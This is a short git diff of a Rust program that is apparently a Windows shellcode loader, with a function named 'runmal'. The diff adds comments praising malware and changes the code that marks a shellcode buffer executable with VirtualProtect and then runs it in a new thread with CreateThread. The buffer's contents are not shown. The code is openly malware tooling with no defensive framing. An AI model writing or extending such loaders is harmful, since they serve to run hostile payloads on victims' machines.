@@ -1,3 +1,6 @@
+/// hey guys lets code rust today
+/// mmmmm malare...i love malware
+/// not as much as i like...HYPERPOP!!!!
 use winapi::um::winnt::PAGE_EXECUTE;
 use winapi::um::memoryapi::VirtualProtect;
 use winapi::um::processthreadsapi::CreateThread;
@@ -48,12 +51,12 @@ fn runmal() {
 
     unsafe {
         // Change the protection level of the memory region to PAGE_EXECUTE
-        VirtualProtect(
+        if VirtualProtect(
             buf.as_ptr() as *mut _, // pointer to the memory region, in this case the shellcode array
-            318, // size of the shellcode memory region
+            buf.len(), // size of the shellcode memory region
             PAGE_EXECUTE as DWORD, // new protection level
             &mut old_protect, // pointer to the variable that will store the old protection level
-        );
+        ) == 0{panic!("oopise bleehhh")};
 
         // Create a new thread and run the shellcode
         let thread_handle: HANDLE = CreateThread(
